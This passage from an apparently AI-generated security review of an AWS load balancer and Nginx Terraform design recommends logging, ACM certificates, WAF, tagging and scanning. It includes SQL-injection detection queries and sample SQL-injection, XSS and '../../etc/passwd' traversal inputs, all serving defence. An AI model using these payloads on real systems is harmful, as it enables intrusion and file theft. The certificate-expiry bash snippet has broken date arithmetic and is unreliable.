     'input.regex' = '([^ ]*) ([^ ]*) ([^ ]*) ([^ ]*):([0-9]*) ([^ ]*)[:-]([0-9]*) ([-.0-9]*) ([-.0-9]*) ([-.0-9]*) (|[-0-9]*) (-|[-0-9]*) ([-0-9]*) ([-0-9]*) \"([^ ]*) ([^ ]*) (- |[^ ]*)\" \"([^\"]*)\" ([A-Z0-9-]+) ([A-Za-z0-9.-]*)$'
   )
   LOCATION 's3://ec2-nginx-alb-logs-<account-id>/alb-access-logs/';
   
   -- Query: Top 10 source IPs
   SELECT client_ip, COUNT(*) as request_count
   FROM alb_logs
   WHERE time >= '2025-01-29'
   GROUP BY client_ip
   ORDER BY request_count DESC
   LIMIT 10;
   
   -- Query: Detect SQL injection attempts
   SELECT time, client_ip, request_url
   FROM alb_logs
   WHERE request_url LIKE '%union%select%'
      OR request_url LIKE '%or%1=1%'
      OR request_url LIKE '%drop%table%';
   ```

3. **Set up GuardDuty for automated threat detection** (analyzes VPC Flow Logs, CloudTrail, DNS logs)

4. **Document log retention policy** based on compliance requirements

**Cost Impact**:
- S3 storage: ~$0.023/GB/month (Standard) → ~$0.70/month for 30 GB logs
- S3 requests: Negligible (<$0.01/month)
- Athena queries: $5.00 per TB scanned (pay-per-query)
- Total estimated cost: **<$1/month** for development environment

**Code Example**:
```hcl
# Before (MEDIUM RISK - No Access Logs)
module "alb" {
  source  = "app.terraform.io/ravi-panchal-org/alb/aws"
  version = "~> 10.2.0"
  
  # ... configuration ...
  # ❌ No access_logs parameter
}

# After (SECURE - Access Logs Enabled)
resource "aws_s3_bucket" "alb_logs" {
  bucket = "ec2-nginx-alb-logs-${data.aws_caller_identity.current.account_id}"
  
  tags = {
    Purpose     = "ALB access logs for security monitoring"
    Retention   = "90-days"
    Project     = "ec2-alb-nginx"
    Environment = "development"
  }
}

resource "aws_s3_bucket_server_side_encryption_configuration" "alb_logs" {
  bucket = aws_s3_bucket.alb_logs.id
  
  rule {
    apply_server_side_encryption_by_default {
      sse_algorithm = "AES256"
    }
  }
}

resource "aws_s3_bucket_lifecycle_configuration" "alb_logs" {
  bucket = aws_s3_bucket.alb_logs.id
  
  rule {
    id     = "log-retention-policy"
    status = "Enabled"
    
    expiration {
      days = 90
    }
    
    transition {
      days          = 30
      storage_class = "STANDARD_IA"
    }
  }
}

resource "aws_s3_bucket_public_access_block" "alb_logs" {
  bucket = aws_s3_bucket.alb_logs.id
  
  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}

resource "aws_s3_bucket_policy" "alb_logs" {
  bucket = aws_s3_bucket.alb_logs.id
  
  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Sid    = "AllowELBServiceAccount"
      Effect = "Allow"
      Principal = {
        AWS = "arn:aws:iam::114774131450:root"  # ELB service account for ap-southeast-1
      }
      Action   = "s3:PutObject"
      Resource = "${aws_s3_bucket.alb_logs.arn}/*"
    }]
  })
}

module "alb" {
  source  = "app.terraform.io/ravi-panchal-org/alb/aws"
  version = "~> 10.2.0"
  
  # ... existing configuration ...
  
  access_logs = {
    enabled = true
    bucket  = aws_s3_bucket.alb_logs.id
    prefix  = "alb-access-logs"
  }
}
```

**Source**: [Application Load Balancer Access Logs - https://docs.aws.amazon.com/elasticloadbalancing/latest/application/load-balancer-access-logs.html]  
**Reference**: [Analyzing ALB logs with Amazon Athena - https://docs.aws.amazon.com/athena/latest/ug/application-load-balancer-logs.html]

**Effort**: Low (20-30 minutes to configure S3 bucket and enable ALB logging)

---

### 6. No Certificate Expiration Monitoring
**Risk Rating**: Medium  
**Justification**: No monitoring or alerting configured for **SSL/TLS certificate expiration**. Expired certificates cause complete service outages and browser warnings, degrading user trust.

**Finding**:
- File `contracts/alb-listener.hcl:14` references certificate ARN but no expiration monitoring
- File `plan.md:878-882` mentions certificate renewal but no automated alerting
- No CloudWatch alarms for certificate expiration
- Relies on manual ACM console checks

**Impact**:
- **Service Outage**: Expired certificates cause browsers to block access (ERR_CERT_DATE_INVALID)
- **User Trust Loss**: Security warnings damage brand reputation
- **Emergency Response**: Certificate renewal becomes urgent incident instead of planned maintenance
- **Compliance**: SSL/TLS certificate management audit trail gaps

**Recommendation**:
1. **Use AWS Certificate Manager (ACM)** with automatic renewal (recommended):
   ```hcl
   resource "aws_acm_certificate" "alb" {
     domain_name       = "nginx.example.com"
     validation_method = "DNS"  # or "EMAIL"
     
     lifecycle {
       create_before_destroy = true
     }
     
     tags = {
       Project = "ec2-alb-nginx"
     }
   }
   
   # ACM automatically renews 60 days before expiration
   # No manual intervention required
   ```

2. **Set up CloudWatch alarm** for certificate expiration (30-day warning):
   ```hcl
   resource "aws_cloudwatch_metric_alarm" "certificate_expiring" {
     alarm_name          = "alb-certificate-expiring-soon"
     comparison_operator = "LessThanThreshold"
     evaluation_periods  = 1
     metric_name         = "DaysToExpiry"
     namespace           = "AWS/CertificateManager"
     period              = 86400  # 1 day
     statistic           = "Minimum"
     threshold           = 30  # Alert 30 days before expiration
     alarm_description   = "ALB SSL certificate expires in less than 30 days"
     treat_missing_data  = "breaching"
     
     dimensions = {
       CertificateArn = aws_acm_certificate.alb.arn
     }
     
     alarm_actions = [aws_sns_topic.security_alerts.arn]
   }
   ```

3. **Document certificate management** process in operational runbook

4. **For self-signed certificates** (dev only), implement renewal automation:
   ```bash
   # Automated renewal script (for self-signed dev certs)
   #!/bin/bash
   DAYS_UNTIL_EXPIRY=$(openssl x509 -enddate -noout -in /etc/ssl/cert.pem | cut -d= -f2 | xargs -I {} date -d {} +%s - date +%s | awk '{print $1/86400}')
   
   if [ $DAYS_UNTIL_EXPIRY -lt 30 ]; then
     echo "Certificate expires in $DAYS_UNTIL_EXPIRY days - renewing"
     # Generate new certificate
     # Upload to ACM
     # Update ALB listener
   fi
   ```

**Code Example**:
```hcl
# Before (MEDIUM RISK - No Expiration Monitoring)
variable "certificate_arn" {
  description = "ARN of SSL certificate from ACM"
  type        = string
  # ❌ No expiration monitoring or automated renewal
}

# After (SECURE - ACM with Auto-Renewal + Monitoring)
# Use ACM-managed certificate with automatic renewal
resource "aws_acm_certificate" "alb" {
  domain_name       = var.domain_name
  validation_method = "DNS"
  
  subject_alternative_names = [
    "*.${var.domain_name}"  # Wildcard for subdomains
  ]
  
  lifecycle {
    create_before_destroy = true
  }
  
  tags = {
    Name        = "ec2-nginx-alb-certificate"
    Project     = "ec2-alb-nginx"
    Environment = "development"
    AutoRenewal = "enabled"
  }
}

# DNS validation records (if using Route53)
resource "aws_route53_record" "cert_validation" {
  for_each = {
    for dvo in aws_acm_certificate.alb.domain_validation_options : dvo.domain_name => {
      name   = dvo.resource_record_name
      record = dvo.resource_record_value
      type   = dvo.resource_record_type
    }
  }
  
  allow_overwrite = true
  name            = each.value.name
  records         = [each.value.record]
  ttl             = 60
  type            = each.value.type
  zone_id         = data.aws_route53_zone.main.zone_id
}

resource "aws_acm_certificate_validation" "alb" {
  certificate_arn         = aws_acm_certificate.alb.arn
  validation_record_fqdns = [for record in aws_route53_record.cert_validation : record.fqdn]
}

# CloudWatch alarm for expiration warning
resource "aws_cloudwatch_metric_alarm" "certificate_expiration" {
  alarm_name          = "alb-certificate-expires-soon"
  comparison_operator = "LessThanThreshold"
  evaluation_periods  = 1
  metric_name         = "DaysToExpiry"
  namespace           = "AWS/CertificateManager"
  period              = 86400
  statistic           = "Minimum"
  threshold           = 30
  alarm_description   = "SSL certificate expires in less than 30 days"
  treat_missing_data  = "breaching"
  
  dimensions = {
    CertificateArn = aws_acm_certificate.alb.arn
  }
  
  alarm_actions = [aws_sns_topic.ops_alerts.arn]
}

# SNS topic for alerts
resource "aws_sns_topic" "ops_alerts" {
  name = "ec2-nginx-ops-alerts"
  
  tags = {
    Purpose = "Operational alerts for EC2 Nginx infrastructure"
  }
}

# Use ACM certificate in ALB listener
module "alb" {
  # ... existing configuration ...
  
  https_listeners = [{
    port            = 443
    protocol        = "HTTPS"
    certificate_arn = aws_acm_certificate.alb.arn  # ✅ ACM auto-renews 60 days before expiration
    ssl_policy      = "ELBSecurityPolicy-TLS13-1-2-Res-PQ-2025-09"
  }]
}
```

**Source**: [AWS Certificate Manager - Managed Renewal - https://docs.aws.amazon.com/acm/latest/userguide/managed-renewal.html]  
**Reference**: [Monitoring certificate expiration with CloudWatch - https://docs.aws.amazon.com/acm/latest/userguide/cloudwatch-metrics.html]

**Effort**: Low (15 minutes to set up CloudWatch alarm, ACM auto-renewal is automatic)

---

### 7. Missing Security Group Description Best Practices

**Risk Rating**: Medium  
**Justification**: Security group rules lack **detailed descriptions** documenting justification and risk acceptance. Poor documentation makes security audits difficult and increases risk of misconfigurations during maintenance.

**Finding**:
- File `contracts/security-rules.hcl:18` has generic description: "HTTPS from internet (public access)"
- No documentation of **why** 0.0.0.0/0 is necessary for ALB
- No risk acceptance statements for permissive rules
- Security checklist doesn't enforce description quality standards

**Impact**:
- **Audit Failures**: Compliance auditors flag undocumented permissive rules
- **Configuration Drift**: Future engineers don't understand rule purpose and hesitate to modify
- **Security Misunderstandings**: Team members unclear on which rules are intentionally permissive vs. mistakes
- **Incident Response Delays**: During security incidents, unclear rule purposes slow investigation

**Recommendation**:
1. **Enhance security group rule descriptions** with context and justification:
   ```hcl
   ingress_rules = {
     https_from_internet = {
       description = "HTTPS:443 from Internet (0.0.0.0/0) - REQUIRED for public ALB; Encrypted via TLS 1.3; Risk Accepted: Public web service; ALT: CloudFront distribution"
       from_port   = 443
       to_port     = 443
       ip_protocol = "tcp"
       cidr_ipv4   = "0.0.0.0/0"
     }
   }
   ```

2. **Document risk acceptance** for permissive rules in code comments

3. **Add security rule documentation template**

4. **Implement automated description validation** (Sentinel policy or OPA)

**Code Example**:
```hcl
# Before (MEDIUM RISK - Poor Documentation)
ingress_rules = {
  https_from_internet = {
    description = "HTTPS from internet (public access)"  # ❌ Generic, no justification
    from_port   = 443
    to_port     = 443
    ip_protocol = "tcp"
    cidr_ipv4   = "0.0.0.0/0"
  }
}

# After (DOCUMENTED - Clear Justification)
# Security Rule Documentation Standard:
# Format: "<Protocol>:<Port> from <Source> - <JUSTIFICATION>; <ENCRYPTION>; <RISK_ACCEPTANCE>; <ALTERNATIVES>"

ingress_rules = {
  https_from_internet = {
    description = "HTTPS:443 from Internet (0.0.0.0/0) - REQUIRED for internet-facing Application Load Balancer serving public website; Encrypted via TLS 1.3 (ELBSecurityPolicy-TLS13-1-2-Res-PQ-2025-09); Risk Accepted: Public web service with static content only; Alternative Considered: CloudFront distribution (adds cost, not needed for dev); Approved By: Security Team; Date: 2025-01-29"
    from_port   = 443
    to_port     = 443
    ip_protocol = "tcp"
    cidr_ipv4   = "0.0.0.0/0"
  }
  
  http_redirect = {
    description = "HTTP:80 from Internet (0.0.0.0/0) - Redirect to HTTPS only; No sensitive data transmitted; Improves UX by auto-redirecting HTTP to HTTPS; ALT: Reject HTTP entirely (breaks some clients)"
    from_port   = 80
    to_port     = 80
    ip_protocol = "tcp"
    cidr_ipv4   = "0.0.0.0/0"
  }
}

egress_rules = {
  to_ec2_instances = {
    description = "HTTP:80 to EC2 Nginx Instances - ALB forwards decrypted traffic to backend; TLS termination at ALB reduces EC2 CPU overhead; Security Group reference ensures only registered targets receive traffic; Risk: Unencrypted VPC traffic (acceptable within isolated VPC); Alternative: End-to-end TLS (adds complexity, minimal security benefit in VPC)"
    from_port                    = 80
    to_port                      = 80
    ip_protocol                  = "tcp"
    referenced_security_group_id = module.ec2_security_group.security_group_id
  }
}
```

**Effort**: Low (10 minutes to enhance descriptions for all security group rules)

---

### 8. No AWS WAF Protection

**Risk Rating**: Medium  
**Justification**: Application Load Balancer **lacks AWS WAF** (Web Application Firewall) protection. Without WAF, the application is vulnerable to common web attacks (SQL injection, XSS, DDoS) that can exploit Nginx or future applications.

**Finding**:
- File `spec.md:181` explicitly lists "WAF (Web Application Firewall) rules" as **out of scope**
- File `contracts/security-rules.hcl:94` mentions "Optional: Add AWS WAF for additional protection"
- No budget allocated for WAF ($5/month base + usage charges)

**Impact**:
- **OWASP Top 10 Vulnerabilities**: No protection against SQL injection, XSS, CSRF
- **DDoS Attacks**: No rate limiting or geographic blocking
- **Bot Traffic**: No bot detection or CAPTCHA challenges
- **Zero-Day Exploits**: No virtual patching capability

**Common Attacks Prevented by WAF**:
- SQL Injection: `?id=1' OR '1'='1`
- Cross-Site Scripting (XSS): `<script>alert('XSS')</script>`
- Path Traversal: `../../etc/passwd`
- DDoS: 10,000 requests/second from single IP
- Geographic blocking: Block traffic from high-risk countries

**Recommendation**:
1. **For Development Environment**: Accept risk with documentation
   ```
   ACCEPTED RISK: No AWS WAF protection
   Environment: Development
   Justification: Static content only, no database, cost optimization
   Compensating Controls:
   - Nginx hardened with security configurations
   - Regular Nginx security patches
   - ALB access logs for incident investigation
   Production Blocker: YES - Must implement AWS WAF before production
   ```

2. **For Production**: Implement AWS WAF with Managed Rule Groups:
   ```hcl
   resource "aws_wafv2_web_acl" "alb_protection" {
     name  = "ec2-nginx-alb-protection"
     scope = "REGIONAL"
     
     default_action {
       allow {}
     }
     
     # AWS Managed Rules - Core Rule Set (protects against OWASP Top 10)
     rule {
       name     = "AWSManagedRulesCommonRuleSet"
       priority = 1
       
       override_action {
         none {}
       }
       
       statement {
         managed_rule_group_statement {
           name        = "AWSManagedRulesCommonRuleSet"
           vendor_name = "AWS"
         }
       }
       
       visibility_config {
         cloudwatch_metrics_enabled = true
         metric_name                = "AWSManagedRulesCommonRuleSetMetric"
         sampled_requests_enabled   = true
       }
     }
     
     # Rate limiting rule (prevent DDoS)
     rule {
       name     = "RateLimitRule"
       priority = 2
       
       action {
         block {}
       }
       
       statement {
         rate_based_statement {
           limit              = 2000  # Max 2000 requests per 5 minutes per IP
           aggregate_key_type = "IP"
         }
       }
       
       visibility_config {
         cloudwatch_metrics_enabled = true
         metric_name                = "RateLimitRuleMetric"
         sampled_requests_enabled   = true
       }
     }
     
     visibility_config {
       cloudwatch_metrics_enabled = true
       metric_name                = "WAFMetric"
       sampled_requests_enabled   = true
     }
     
     tags = {
       Project     = "ec2-alb-nginx"
       Environment = "production"
     }
   }
   
   resource "aws_wafv2_web_acl_association" "alb" {
     resource_arn = module.alb.arn
     web_acl_arn  = aws_wafv2_web_acl.alb_protection.arn
   }
   ```

3. **Cost**: ~$5-10/month for basic WAF protection (acceptable for production)

**Effort**: 
- Development: Low (5 minutes to document risk acceptance)
- Production: Medium (45 minutes to configure WAF with managed rules)

---

## LOW (P3) - Add to Backlog

---

### 9. No Resource Tagging Standards Enforcement

**Risk Rating**: Low  
**Justification**: While `common_tags` are defined, **no enforcement mechanism** ensures all resources are properly tagged. Missing tags hinder cost allocation, resource management, and compliance reporting.

**Finding**:
- File `data-model.md:54-63` defines default tags
- File `plan.md` mentions resource tagging (FR-018, SC-014)
- No validation that all resources inherit tags
- No mandatory tag requirements enforced via Terraform

**Impact**:
- **Cost Tracking Gaps**: Cannot accurately allocate costs to projects/teams
- **Resource Orphaning**: Difficulty identifying resource ownership during cleanups
- **Compliance Reports**: Incomplete audit trails for regulatory requirements
- **Operational Confusion**: Unclear which resources belong to which environment

**Recommendation**:
1. **Implement tag validation** using Sentinel policy (HCP Terraform):
   ```hcl
   # sentinel.hcl
   policy "enforce-mandatory-tags" {
     enforcement_level = "hard-mandatory"
   }
   ```

2. **Define mandatory tags**:
   ```hcl
   locals {
     mandatory_tags = {
       Project     = var.project_name
       Environment = var.environment
       ManagedBy   = "terraform"
       CostCenter  = var.cost_center
       Owner       = var.owner_email
     }
   }
   ```

3. **Use AWS Tag Policies** (AWS Organizations):
   ```json
   {
     "tags": {
       "Project": {
         "tag_key": {
           "@@assign": "Project"
         },
         "enforced_for": {
           "@@assign": ["ec2:instance", "elasticloadbalancing:loadbalancer"]
         }
       }
     }
   }
   ```

**Effort**: Medium (30 minutes to implement Sentinel policy or AWS Tag Policy)

---

### 10. No Automated Security Scanning

**Risk Rating**: Low  
**Justification**: Infrastructure code lacks **automated security scanning** (SAST/IaC scanning). Manual reviews are error-prone and don't scale. Tools like Checkov, tfsec, or Snyk can identify misconfigurations before deployment.

**Finding**:
- File `.pre-commit-config.yaml` exists but security scanning tools not configured
- No CI/CD pipeline security gates
- Manual security reviews only

**Impact**:
- **Misconfigurations Deploy to Production**: Human error in code reviews
- **Slow Feedback Loops**: Security issues discovered late in SDLC
- **No Drift Detection**: Changes bypass security checks
- **Inconsistent Standards**: Different reviewers apply different criteria

**Recommendation**:
1. **Add tfsec to pre-commit hooks**:
   ```yaml
   # .pre-commit-config.yaml
   repos:
     - repo: https://github.com/aquasecurity/tfsec
       rev: v1.28.1
       hooks:
         - id: tfsec
           args: [--minimum-severity=MEDIUM]
   ```

2. **Integrate Checkov in CI/CD**:
   ```bash
   # .github/workflows/security-scan.yml
   - name: Run Checkov
     uses: bridgecrewio/checkov-action@master
     with:
       directory: .
       framework: terraform
       soft_fail: false  # Fail build on HIGH/CRITICAL issues
   ```

3. **Enable Terraform Cloud Sentinel Policies** (HCP Terraform built-in)

**Effort**: Low (20 minutes to configure pre-commit hooks and CI/CD integration)

---

## Security Compliance Matrix

| AWS Well-Architected Pillar | Control | Status | Finding # |
|------------------------------|---------|--------|-----------|
| **SEC03 - Identity & Access Management** | Grant least privilege access | ⚠️ Non-Compliant | #1 (Critical) |
| **SEC08 - Data Protection** | Encrypt data at rest | ⚠️ Non-Compliant | #2 (High) |
| **SEC08 - Data Protection** | Encrypt data in transit | ✅ Compliant | Post-quantum TLS |
| **SEC05 - Network Protection** | Control network traffic | ⚠️ Partial | #4 (High) |
| **SEC04 - Detection** | Configure service and application logging | ⚠️ Non-Compliant | #5 (Medium) |
| **SEC01 - Security Foundations** | Enforce IMDSv2 | ⚠️ Non-Compliant | #3 (High) |
| **SEC05 - Network Protection** | Create network layers | ✅ Compliant | Security groups |
| **SEC07 - Application Security** | Implement WAF | ⚠️ Not Implemented | #8 (Medium) |

---

## Remediation Summary

### Immediate Actions (Before Next Deployment)

1. **Define custom IAM policy** with only Session Manager permissions → Remove generic AWS managed policies
2. **Enable EBS encryption** with KMS CMK and key rotation
3. **Enforce IMDSv2** with `http_tokens = "required"` and `hop_limit = 1`
4. **Implement VPC endpoints** (S3 + SSM) or document egress risk acceptance

**Estimated Total Effort**: 2-3 hours  
**Security Improvement**: Eliminates 1 Critical + 3 High risks

### Short-Term (Current Sprint)

5. **Enable ALB access logs** to S3 with lifecycle policies
6. **Configure ACM certificate** with CloudWatch expiration alarm
7. **Enhance security group descriptions** with justifications
8. **Document WAF risk acceptance** (or implement for production)

**Estimated Total Effort**: 2 hours  
**Security Improvement**: Enables incident response and monitoring

### Long-Term (Backlog)

9. **Implement tag enforcement** via Sentinel or AWS Tag Policies
10. **Add automated security scanning** (tfsec, Checkov) to pre-commit and CI/CD

**Estimated Total Effort**: 1 hour  
**Security Improvement**: Prevents future misconfigurations

---

## Conclusion

The EC2 ALB Nginx infrastructure design demonstrates **strong foundational security** with HTTPS enforcement, network isolation, and private registry modules. However, **4 Critical/High-priority gaps** must be addressed before production:

1. **IAM Least Privilege** (Critical): Replace generic managed policies with custom minimal permissions
2. **EBS Encryption** (High): Enable encryption at rest with KMS CMK
3. **IMDSv2 Enforcement** (High): Protect against SSRF attacks
4. **Network Egress Control** (High): Implement VPC endpoints or accept documented risk

**Recommended Next Steps**:
1. Implement Critical/High findings (estimated 2-3 hours)
2. Schedule security architecture review with team
3. Create GitHub issue tracking remediation tasks
4. Update security checklist in `plan.md` with validation steps
5. Re-run security evaluation after fixes

**Overall Security Posture**: ⚠️ **Development Ready** / 🚫 **Production Blocked** (until Critical/High resolved)

---

**Evaluation Completed**: 2025-01-29  
**Reviewed By**: AWS Security Advisor Agent  
**Next Review**: After remediation of Critical/High findings
